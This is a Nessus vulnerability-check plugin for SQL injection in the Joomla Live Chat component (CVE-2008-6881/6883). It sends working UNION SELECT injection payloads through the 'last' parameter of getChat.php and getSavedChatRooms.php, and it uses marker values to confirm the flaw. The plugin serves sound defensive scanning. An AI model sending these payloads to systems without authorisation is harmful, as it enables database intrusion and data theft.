#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35109);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2008-6881", "CVE-2008-6883");
  script_bugtraq_id(32803);
  script_osvdb_id(56710, 56711);
  script_xref(name:"EDB-ID", value:"7441");

  script_name(english:"Live Chat Component for Joomla! 'last' Parameter Multiple SQLi");
  script_summary(english:"Attempts to manipulate chat XML output.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple SQL injection vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of the Live Chat component for Joomla! running on the
remote host is affected by multiple SQL injection vulnerabilities in
getChat.php and getSavedChatRooms.php due to improper sanitization of
user-supplied input to the 'last' parameter before using it to
construct database queries. Regardless of the PHP 'magic_quotes_gpc'
setting, an unauthenticated, remote attacker can exploit these issues
to manipulate database queries, resulting in disclosure of sensitive
information, modification of data, or other attacks against the
underlying database.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/12/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "Live Chat";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>Live Chat</name>');
  checks["/administrator/components/com_livechat/livechat.xml"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

magic1 = unixtime();
magic2 = rand();

if (thorough_tests)
{
  exploits = make_list(
    "/administrator/components/com_livechat/getChat.php?chat=0&last=1 UNION" +
    " SELECT 1,unhex(hex(concat(" +magic1+ ",0x3a," +magic2+ "))),3,4",

    "/administrator/components/com_livechat/getSavedChatRooms.php?chat=0&last"+
    "=1 UNION SELECT 1,unhex(hex(concat(" +magic1+ ",0x3a," +magic2+ "))),3"
  );
}
else
{
  exploits = make_list(
    "/administrator/components/com_livechat/getChat.php?chat=0&last=1 UNION" +
    " SELECT 1,unhex(hex(concat(" +magic1+ ",0x3a," +magic2+ "))),3,4"
  );
}

# Try to exploit the issue to manipulate record of the last chat.
foreach exploit (exploits)
{
  url = exploit;
  url = str_replace(find:" ", replace:"%20", string:url);

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + url,
    exit_on_fail : TRUE
  );

  # There's a problem if we could manipulate the user element.
  if
  (
    (
      "getChat.php" >< exploit &&
      "<user>" +magic1+ ":" +magic2+ "</user>" >< res[2]
    ) ||
    (
      "getSavedChatRooms.php" >< exploit &&
      "<name>" +magic1+ ":" +magic2+ "</name>" >< res[2]
    )
  )
  {
    output = strstr(res[2], "<user>"+magic1);
    if (empty_or_null(output))
      output = strstr(res[2], "<name>" +magic1);
    if (empty_or_null(output))
      output = res[2];

    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      sqli        : TRUE,
      line_limit  : 2,
      generic     : TRUE,
      request     : make_list(install_url + url),
      output      : chomp(output)
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
